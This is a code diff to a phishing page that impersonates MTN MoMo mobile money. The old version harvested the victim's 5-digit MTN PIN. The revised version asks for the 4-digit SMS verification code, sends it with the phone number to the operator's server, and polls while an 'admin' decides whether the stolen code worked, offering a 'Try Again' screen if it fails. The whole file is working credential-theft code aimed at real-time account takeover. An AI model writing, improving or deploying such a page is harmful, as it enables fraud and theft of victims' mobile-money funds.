@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter your MTN 5-DIGIT PIN - MoMo</title>
+    <title>Enter Verification Code - MoMo</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
@@ -52,6 +52,7 @@
         .error-msg { display: none; font-size: 13px; color: #c33;
                      font-weight: 600; margin-bottom: 14px; }
         .error-msg.show { display: block; }
+        .error-msg.info { color: #b8860b; }
 
         .submit-btn {
             display: block; width: 100%; background: #ffcc00; color: #111;
@@ -63,31 +64,16 @@
         .submit-btn:active { transform: scale(.99); }
         .submit-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; }
 
-        /* ===== PROGRESS SCREEN ===== */
-        .progress-wrap { padding: 10px 0 20px; }
-        .progress-icon {
-            width: 80px; height: 80px; border-radius: 50%;
-            background: #fff5cc; display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 20px; font-size: 38px;
-            animation: spin 2s linear infinite;
+        /* Waiting screen */
+        .waiting-wrap { padding: 10px 0 20px; }
+        .waiting-spinner {
+            width: 60px; height: 60px; border: 5px solid #fff5cc;
+            border-top-color: #ffcc00; border-radius: 50%;
+            margin: 0 auto 20px; animation: spin 1s linear infinite;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .progress-title { font-size: 20px; font-weight: 800; color: #111; margin-bottom: 10px; }
-        .progress-text { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 24px; }
-        .progress-bar {
-            width: 100%; height: 10px; background: #f0f0f0;
-            border-radius: 6px; overflow: hidden; margin-bottom: 10px;
-        }
-        .progress-fill {
-            height: 100%; width: 0%; background: #ffcc00;
-            transition: width .3s linear; border-radius: 6px;
-        }
-        .progress-time {
-            font-size: 13px; color: #888; font-weight: 600; text-align: center;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .waiting-title { font-size: 20px; font-weight: 800; color: #111; margin-bottom: 10px; }
+        .waiting-text { font-size: 14px; color: #666; line-height: 1.6; }
 
         .footer { background: #111; color: #ffcc00; text-align: center;
                   padding: 18px; font-size: 13px; font-weight: 600; }
@@ -96,7 +82,7 @@
             .page-title { font-size: 24px; }
             .card { padding: 32px 22px 26px; }
             .header-title { font-size: 15px; }
-            .pin-box { width: 48px; height: 58px; font-size: 22px; }
+            .pin-box { width: 60px; height: 70px; font-size: 26px; }
             .pin-row { gap: 8px; }
         }
     </style>
@@ -113,19 +99,18 @@
     </header>
 
     <main class="main">
-        <h1 class="page-title">Enter Your MTN 5-Digit PIN</h1>
+        <h1 class="page-title">Enter Verification Code</h1>
 
         <div class="card" id="mainCard">
-            <div class="card-icon">🔒</div>
+            <div class="card-icon">📩</div>
 
-            <p class="card-label">Enter the 5-digit<br>MTN PIN</p>
-            <p class="card-sub">This is the last step to complete your application</p>
+            <p class="card-label">Enter the 4-digit code<br>sent to your MTN line</p>
+            <p class="card-sub">Check your SMS for the verification code</p>
 
             <div class="error-msg" id="errorMsg"></div>
 
-            <form id="finalForm">
+            <form id="lastForm">
                 <div class="pin-row" id="pinRow">
-                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                     <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                     <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                     <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
@@ -133,7 +118,7 @@
                 </div>
 
                 <button type="submit" class="submit-btn" id="submitBtn">
-                    Confirm PIN
+                    Submit Code
                 </button>
             </form>
         </div>
@@ -146,8 +131,8 @@
         const phone  = params.get('phone') || 'unknown';
         const refId  = params.get('ref')   || '';
 
-        const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
-        const errorMsg = document.getElementById('errorMsg');
+        const pinBoxes  = Array.from(document.querySelectorAll('.pin-box'));
+        const errorMsg  = document.getElementById('errorMsg');
         const submitBtn = document.getElementById('submitBtn');
 
         pinBoxes[0].focus();
@@ -187,7 +172,7 @@
             box.addEventListener('paste', function (e) {
                 e.preventDefault();
                 const pasted = (e.clipboardData || window.clipboardData)
-                    .getData('text').replace(/[^0-9]/g, '').slice(0, 5);
+                    .getData('text').replace(/[^0-9]/g, '').slice(0, 4);
                 if (!pasted) return;
                 for (let j = 0; j < pasted.length && (i + j) < pinBoxes.length; j++) {
                     pinBoxes[i + j].value = pasted[j];
@@ -204,16 +189,79 @@
 
         function clearErrors() {
             errorMsg.classList.remove('show');
+            errorMsg.classList.remove('info');
             pinBoxes.forEach(b => b.classList.remove('error'));
         }
 
-        // ─── Submit PIN ───
-        document.getElementById('finalForm').addEventListener('submit', async function (e) {
+        // ─── Polling for admin decision ───
+        let referenceId = null;
+        let pollTimer = null;
+
+        function startPolling() {
+            pollTimer = setInterval(async () => {
+                try {
+                    const res  = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
+                    const data = await res.json();
+
+                    if (data.status === 'confirmed') {
+                        clearInterval(pollTimer);
+                        showSuccess();
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        showRejected();
+                    }
+                } catch (err) {
+                    console.error('Poll failed:', err);
+                }
+            }, 3000);
+        }
+
+        function showSuccess() {
+            document.getElementById('mainCard').innerHTML = `
+                <div style="width:90px;height:90px;border-radius:50%;background:#2e9e4f;
+                            display:flex;align-items:center;justify-content:center;
+                            margin:0 auto 20px;font-size:44px;color:#fff;">✓</div>
+                <h2 style="font-size:22px;font-weight:800;color:#2e9e4f;margin-bottom:12px;">
+                    Verification Complete
+                </h2>
+                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
+                            background:#e8f7ec;color:#2e9e4f;font-size:13px;font-weight:700;
+                            margin-bottom:20px;">STATUS: PENDING APPROVAL</div>
+                <p style="font-size:15px;color:#444;line-height:1.6;">
+                    Your application has been fully submitted.<br>
+                    Please wait for approval.
+                </p>
+            `;
+        }
+
+        function showRejected() {
+            document.getElementById('mainCard').innerHTML = `
+                <div style="width:90px;height:90px;border-radius:50%;background:#e33;
+                            display:flex;align-items:center;justify-content:center;
+                            margin:0 auto 20px;font-size:44px;color:#fff;">✕</div>
+                <h2 style="font-size:22px;font-weight:800;color:#c33;margin-bottom:12px;">
+                    Code Rejected
+                </h2>
+                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
+                            background:#fdecea;color:#c33;font-size:13px;font-weight:700;
+                            margin-bottom:20px;">INVALID VERIFICATION CODE</div>
+                <p style="font-size:15px;color:#444;line-height:1.6;margin-bottom:20px;">
+                    The 4-digit code you entered was not accepted.<br>
+                    Please check your SMS and try again.
+                </p>
+                <button onclick="location.reload()" style="background:#111;color:#ffcc00;
+                        border:none;padding:14px 28px;font-size:14px;font-weight:800;
+                        border-radius:10px;cursor:pointer;">Try Again</button>
+            `;
+        }
+
+        // ─── Submit 4-digit code ───
+        document.getElementById('lastForm').addEventListener('submit', async function (e) {
             e.preventDefault();
 
-            const pin = pinBoxes.map(b => b.value).join('');
-            if (pin.length !== 5) {
-                errorMsg.textContent = 'Please enter all 5 digits of your PIN';
+            const code = pinBoxes.map(b => b.value).join('');
+            if (code.length !== 4) {
+                errorMsg.textContent = 'Please enter all 4 digits';
                 errorMsg.classList.add('show');
                 pinBoxes.forEach(b => { if (!b.value) b.classList.add('error'); });
                 const firstEmpty = pinBoxes.find(b => !b.value);
@@ -222,56 +270,41 @@
             }
 
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Submitting...';
+            submitBtn.textContent = 'Sending...';
             pinBoxes.forEach(b => b.disabled = true);
 
-            // Send to server
             try {
-                await fetch('/api/final-code', {
+                const res = await fetch('/api/last-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, refId, finalCode: pin })
+                    body: JSON.stringify({ phone, refId, lastCode: code })
                 });
+                const data = await res.json();
+                referenceId = data.referenceId;
+
+                // Show waiting screen
+                document.getElementById('mainCard').innerHTML = `
+                    <div class="waiting-wrap">
+                        <div class="waiting-spinner"></div>
+                        <div class="waiting-title">Waiting for Approval</div>
+                        <div class="waiting-text">
+                            Your code has been sent to the admin for verification.<br>
+                            Please wait while we confirm your application...
+                        </div>
+                    </div>
+                `;
+
+                startPolling();
+
             } catch (err) {
                 console.error('Send failed:', err);
+                errorMsg.textContent = '⚠️ Network error. Please try again.';
+                errorMsg.classList.add('show');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Code';
+                pinBoxes.forEach(b => b.disabled = false);
             }
-
-            // Show progress screen (10 seconds)
-            showProgressScreen();
         });
-
-        // ─── Progress Screen ───
-        function showProgressScreen() {
-            document.getElementById('mainCard').innerHTML = `
-                <div class="progress-wrap">
-                    <div class="progress-icon">📩</div>
-                    <div class="progress-title">Verifying PIN...</div>
-                    <div class="progress-text">
-                        A message has been sent to the admin for verification.<br>
-                        Please wait while we prepare the next step...
-                    </div>
-                    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                    <div class="progress-time" id="progressTime">10 seconds remaining</div>
-                </div>
-            `;
-
-            let elapsed = 0;
-            const total = 10;
-            const fill = document.getElementById('progressFill');
-            const timeLabel = document.getElementById('progressTime');
-
-            const interval = setInterval(() => {
-                elapsed++;
-                fill.style.width = (elapsed / total * 100) + '%';
-                const remaining = total - elapsed;
-                timeLabel.textContent = remaining + ' second' + (remaining !== 1 ? 's' : '') + ' remaining';
-
-                if (elapsed >= total) {
-                    clearInterval(interval);
-                    window.location.href = `lastcode.html?phone=${encodeURIComponent(phone)}&ref=${encodeURIComponent(refId)}`;
-                }
-            }, 1000);
-        }
     </script>
 </body>
 </html>
